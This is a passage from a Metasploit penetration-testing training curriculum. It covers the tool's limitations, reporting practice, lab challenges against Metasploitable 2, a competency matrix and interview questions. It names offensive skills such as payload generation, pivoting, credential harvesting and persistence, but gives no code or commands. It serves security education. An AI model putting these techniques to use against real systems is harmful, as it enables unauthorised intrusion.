- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Objective** | Map Metasploit capabilities to PTES: Intelligence Gathering (auxiliary scanners), Vulnerability Analysis (vuln scanners, exploit suggester), Exploitation (exploit modules), Post-Exploitation (post modules, Meterpreter), Reporting (database export, loot). |

---

### Task 7.2 — Metasploit Limitations

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Key Limitations** | Heavily signatured by IDS/AV (Meterpreter is detected by every modern AV). OSCP restricts its use. Not for web application testing (use Burp). Not for password cracking (use Hashcat/John). Creates noisy network traffic. Modules may be outdated or unreliable. Over-reliance prevents learning manual exploitation. |

---

### Task 7.3 — When NOT to Use Metasploit

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Situations** | Red team engagements with EDR (use custom C2). OSCP exam beyond one machine (restriction). When a simpler manual exploit exists (faster, more educational). When stealth is critical. Web application testing (Burp Suite). Password cracking (Hashcat). |

---

### Task 7.4 — Professional Metasploit Documentation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| **Objective** | Document Metasploit usage in professional reports: exploit module used, options configured, payload selected, session obtained, evidence (screenshots of `sysinfo`, `getuid`), impact statement. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Full Engagement Simulation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 180 min

| **Scenario** | Perform a complete simulated engagement: Nmap scan → import to MSF → identify vulnerabilities → exploit three services → post-exploitation on each → pivot to internal network → produce a professional report. |

---

### Challenge 8.2 — Manual + Metasploit Comparison

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Exploit the same vulnerability twice: once manually (with standalone exploit code) and once with Metasploit. Document the differences in effort, reliability, output, and learning value. |

---

### Challenge 8.3 — Custom Module Development

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 180 min

| **Scenario** | Write a custom auxiliary scanner module that checks for a specific misconfiguration across a network. Package it properly and load it into msfconsole. |

---

### Challenge 8.4 — Teach Metasploit

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Prepare a 30-minute Metasploit workshop: architecture overview, first exploit walkthrough, Meterpreter basics, msfvenom, and multi/handler. Live demo against Metasploitable 2. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can navigate msfconsole fluently | ☐ |
| Can search, select, and configure exploits | ☐ |
| Can generate payloads with msfvenom | ☐ |
| Can set up and manage multi/handler listeners | ☐ |
| Can use Meterpreter for post-exploitation | ☐ |
| Can pivot through compromised hosts | ☐ |
| Can harvest credentials and crack hashes | ☐ |
| Can manage the database and workspaces | ☐ |
| Can automate workflows with resource scripts | ☐ |
| Can explain staged vs stageless payloads | ☐ |
| Can integrate Metasploit with other tools | ☐ |
| Can teach Metasploit to another person | ☐ |

---

## 🎯 Interview Questions

1. Explain the difference between an exploit, a payload, and a handler.
2. What is the difference between staged and stageless payloads?
3. How do you import Nmap results into Metasploit?
4. Describe how you would pivot through a compromised host to reach an internal network.
5. What are Meterpreter's key advantages over a basic shell?
6. How would you generate a payload for a Linux target? A Windows target? A web application?
7. What is `local_exploit_suggester` and when do you use it?
8. Why is Metasploit heavily signatured by modern AV/EDR?
9. When would you choose NOT to use Metasploit?
10. How do you maintain persistence on a compromised host?
